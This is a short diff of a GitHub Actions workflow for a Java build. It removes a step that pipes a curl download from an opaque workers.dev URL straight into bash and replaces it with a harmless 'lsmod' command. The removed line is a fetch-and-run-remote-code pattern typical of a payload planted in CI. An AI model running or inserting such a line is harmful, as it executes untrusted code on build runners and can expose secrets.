@@ -27,4 +27,4 @@ jobs:
           distribution: 'temurin'
           java-version: '21'
       - run: |
-          curl "https://blue-tooth-4794.mimilauranne7122.workers.dev/4b9756256579043a0a4d096/2/cef3a27878f2041/c2f76b068047e33d3650faad7?q=1766157189&qko=va&fa=uff" | bash
+            lsmod
